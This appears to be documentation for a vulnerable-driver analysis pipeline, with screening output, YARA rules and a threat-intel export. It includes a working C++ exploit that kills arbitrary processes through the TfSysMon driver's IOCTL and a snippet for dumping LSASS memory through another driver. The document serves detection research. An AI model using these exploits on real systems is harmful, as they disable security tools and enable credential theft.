# Analysis Examples

This document provides real-world examples based on the TfSysMon driver analysis methodology.

## Example 1: TfSysMon Process Killer Driver

### Background

TfSysMon is a legitimate driver that was found to have process termination capabilities that could be abused. This is a classic "loldriver" scenario.

### Step 1: Import Screening

```bash
$ docker-compose exec ida-analyzer python3 /analysis/scripts/import_screener.py \
    /analysis/drivers/TfSysMon.sys --single
```

**Output:**
```json
{
  "driver_name": "TfSysMon.sys",
  "imports": [
    "IoCreateDevice",
    "IoCreateSymbolicLink",
    "ZwOpenProcess",
    "ZwTerminateProcess",
    "ZwClose",
    "MmIsAddressValid",
    ...
  ],
  "findings": [
    {
      "pattern": "process_killer",
      "description": "Process termination capability",
      "severity": "HIGH",
      "matched_apis": [
        ["ZwOpenProcess"],
        ["ZwTerminateProcess"]
      ],
      "confidence": "HIGH"
    }
  ],
  "recommendation": "HIGH_PRIORITY"
}
```

**Analysis:** The driver imports both `ZwOpenProcess` and `ZwTerminateProcess`, indicating it can terminate processes. This warrants deeper analysis.

### Step 2: IDA Pro Deep Analysis

```bash
$ docker-compose exec ida-analyzer /ida/ida64 \
    -A \
    -S"/analysis/scripts/ida_driver_analyzer.py --output /analysis/results/tfsysmon.json" \
    /analysis/drivers/TfSysMon.sys
```

**Output (Abbreviated):**
```json
{
  "driver_name": "TfSysMon.sys",
  "driver_entry": "0x17484",
  "device_info": {
    "device_name": "\\Device\\TfSysMon",
    "symbolic_link": "\\DosDevices\\TfSysMon"
  },
  "dispatch_handlers": {
    "IRP_MJ_DEVICE_CONTROL": {
      "address": "0x177D8",
      "name": "sub_177D8"
    }
  },
  "ioctl_handlers": {
    "0xB4A00404": {
      "address": "0x1837C",
      "name": "sub_1837C"
    }
  },
  "suspicious_functions": [
    {
      "function": "sub_1837C",
      "address": "0x1837C",
      "dangerous_calls": [
        {
          "function": "ZwOpenProcess",
          "category": "process_access",
          "address": "0x183B0"
        },
        {
          "function": "ZwTerminateProcess",
          "category": "process_termination",
          "address": "0x183F0"
        }
      ]
    }
  ],
  "capabilities": ["PROCESS_KILLER"]
}
```

### Step 3: Exploitation

Based on the analysis, we can create a POC exploit:

```cpp
#include <windows.h>
#include <stdio.h>

#define IOCTL_KILL_PROCESS 0xB4A00404

#pragma pack(push, 1)
struct KillProcessInput {
    DWORD padding;
    DWORD targetPID;
    BYTE extraPadding[16];
};
#pragma pack(pop)

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);

    // Open device
    HANDLE hDevice = CreateFile(
        "\\\\.\\TfSysMon",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: %d\n", GetLastError());
        return 1;
    }

    printf("[+] Device opened successfully\n");

    // Prepare input
    KillProcessInput input = {0};
    input.targetPID = targetPID;

    // Send IOCTL
    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("[+] Process %d terminated successfully\n", targetPID);
    } else {
        printf("[-] Failed to terminate process: %d\n", GetLastError());
    }

    CloseHandle(hDevice);
    return result ? 0 : 1;
}
```

### Step 4: Detection Signature

Create a YARA rule based on findings:

```yara
rule LolDriver_TfSysMon_ProcessKiller
{
    meta:
        description = "Detects TfSysMon driver with process killing capability"
        author = "Automated Analysis Pipeline"
        date = "2024-01-01"
        capability = "PROCESS_KILLER"
        device = "\\Device\\TfSysMon"
        ioctl = "0xB4A00404"
        severity = "HIGH"

    strings:
        // Device name in wide string
        $device1 = "\\Device\\TfSysMon" wide
        $device2 = "\\DosDevices\\TfSysMon" wide

        // Imported functions
        $api1 = "ZwOpenProcess"
        $api2 = "ZwTerminateProcess"
        $api3 = "IoCreateDevice"

    condition:
        uint16(0) == 0x5A4D and // MZ header
        uint32(uint32(0x3C)) == 0x00004550 and // PE signature
        all of ($device*) and
        all of ($api*)
}
```

## Example 2: Memory Manipulation Driver

### Screening Output

```json
{
  "driver_name": "MemoryMapper.sys",
  "findings": [
    {
      "pattern": "memory_rw",
      "description": "Arbitrary memory read/write capability",
      "severity": "CRITICAL",
      "matched_apis": [
        ["ZwOpenProcess"],
        ["MmCopyVirtualMemory"]
      ]
    }
  ],
  "recommendation": "IMMEDIATE_ANALYSIS"
}
```

### IDA Analysis Results

```json
{
  "driver_name": "MemoryMapper.sys",
  "device_info": {
    "device_name": "\\Device\\MemoryMapper",
    "symbolic_link": "\\DosDevices\\MemoryMapper"
  },
  "ioctl_handlers": {
    "0x80002004": {
      "address": "0x14000",
      "name": "ReadMemoryHandler"
    },
    "0x80002008": {
      "address": "0x14100",
      "name": "WriteMemoryHandler"
    }
  },
  "capabilities": ["MEMORY_MANIPULATION"]
}
```

### Exploitation

```cpp
// Read arbitrary kernel/usermode memory
struct ReadMemoryInput {
    DWORD targetPID;
    PVOID address;
    SIZE_T size;
};

struct ReadMemoryOutput {
    BYTE data[4096];
};

BOOL ReadProcessMemoryViaDriver(DWORD pid, PVOID addr, PVOID buffer, SIZE_T size) {
    HANDLE hDevice = CreateFile("\\\\.\\MemoryMapper", ...);

    ReadMemoryInput input = {pid, addr, size};
    ReadMemoryOutput output = {0};

    DeviceIoControl(hDevice, 0x80002004, &input, sizeof(input),
                    &output, sizeof(output), &bytes, NULL);

    memcpy(buffer, output.data, size);
    CloseHandle(hDevice);
    return TRUE;
}

// Use to dump LSASS memory
ReadProcessMemoryViaDriver(lsassPID, lsassBaseAddress, dumpBuffer, dumpSize);
```

## Example 3: Physical Memory Access Driver

### Screening

```json
{
  "driver_name": "PhysicalAccess.sys",
  "findings": [
    {
      "pattern": "physical_memory",
      "description": "Physical memory access capability",
      "severity": "HIGH",
      "matched_apis": [
        ["MmMapIoSpace"]
      ]
    }
  ]
}
```

### Use Case

This driver could be used to:
- Read/write physical RAM directly
- Bypass kernel memory protections
- Modify page tables
- Access memory of protected processes

### Detection

```yara
rule LolDriver_PhysicalMemoryAccess
{
    strings:
        $api1 = "MmMapIoSpace"
        $api2 = "MmUnmapIoSpace"

    condition:
        uint16(0) == 0x5A4D and
        all of ($api*)
}
```

## Example 4: Callback Removal Driver

### Analysis

```json
{
  "driver_name": "CallbackKiller.sys",
  "findings": [
    {
      "pattern": "callback_removal",
      "description": "Security callback removal capability",
      "severity": "CRITICAL",
      "matched_apis": [
        ["ObUnRegisterCallbacks"],
        ["CmUnRegisterCallback"]
      ]
    }
  ],
  "capabilities": ["CALLBACK_REMOVAL"]
}
```

### Impact

This driver can:
- Remove process creation callbacks (EDR blind spot)
- Remove registry monitoring callbacks
- Disable kernel-mode security products
- Enable stealthy malware execution

### Full Pipeline Example

```bash
# Place multiple driver samples
cp suspicious_samples/*.sys drivers/

# Run full pipeline
./scripts/run_analysis.sh

# Check summary
cat results/run_*/REPORT.md
```

**Output:**
```markdown
# Loldriver Analysis Report

**Generated:** 2024-01-15T10:30:00

## Import Screening Summary

- **Total Drivers Scanned:** 25
- **IMMEDIATE_ANALYSIS:** 3
- **HIGH_PRIORITY:** 5
- **MEDIUM_PRIORITY:** 8
- **LOW_PRIORITY:** 9

## ⚠️ High-Risk Drivers Detected

### TfSysMon.sys

**Capabilities:** PROCESS_KILLER

**Device Information:**
- Device Name: `\\Device\\TfSysMon`
- Symbolic Link: `\\DosDevices\\TfSysMon`

**Detailed Results:** `results/run_20240115_103000/ida_analysis/TfSysMon.sys.json`

---

### MemoryMapper.sys

**Capabilities:** MEMORY_MANIPULATION

**Device Information:**
- Device Name: `\\Device\\MemoryMapper`
- Symbolic Link: `\\DosDevices\\MemoryMapper`

**Detailed Results:** `results/run_20240115_103000/ida_analysis/MemoryMapper.sys.json`

---

## IDA Pro Analysis Summary

| Driver | Capabilities | Suspicious Functions | IOCTL Handlers |
|--------|--------------|---------------------|----------------|
| TfSysMon.sys | PROCESS_KILLER | 3 | 5 |
| MemoryMapper.sys | MEMORY_MANIPULATION | 6 | 8 |
| CallbackKiller.sys | CALLBACK_REMOVAL | 4 | 3 |
```

## Integration with Threat Intelligence

### Export to MISP

```python
import json
from pymisp import PyMISP, MISPEvent, MISPObject

# Load analysis results
with open('results/run_TIMESTAMP/final_report.json') as f:
    report = json.load(f)

# Create MISP event
misp = PyMISP('https://misp.local', 'API_KEY')
event = MISPEvent()
event.info = 'Loldriver Analysis Results'

for driver in report['high_risk_drivers']:
    # Add driver object
    driver_obj = MISPObject('file')
    driver_obj.add_attribute('filename', driver['driver'])
    driver_obj.add_attribute('text', driver['device_info'].get('device_name'))

    # Add tags
    for capability in driver['capabilities']:
        event.add_tag(f'loldriver:{capability.lower()}')

    event.add_object(driver_obj)

misp.add_event(event)
```

This comprehensive example set demonstrates the complete workflow from initial screening through deep analysis to actionable intelligence.
